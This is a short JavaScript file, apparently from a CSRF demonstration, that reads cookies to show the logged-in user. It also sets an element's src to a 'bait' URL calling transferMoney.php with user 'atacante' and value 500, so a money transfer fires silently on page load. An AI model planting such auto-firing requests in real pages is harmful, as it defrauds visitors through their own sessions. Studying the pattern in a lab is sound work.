
function getCookie(cname) {
    var name = cname + "=";
    var decodedCookie = decodeURIComponent(document.cookie);
    var ca = decodedCookie.split(';');
    for(var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

function showUser(){
    if ( getCookie("user") !== "" ) //User is Logged
    {
        $("#loggedUser").text(getCookie("user"));
    }

    //let root = "floating-ravine-68691.herokuapp.com" ;
    let bait = "http://beti-csrf.herokuapp.com/transferMoney.php?user=atacante&value=500";
    //let link = root+bait;
    console.log(bait);
    $("#link").attr("src", bait);
}
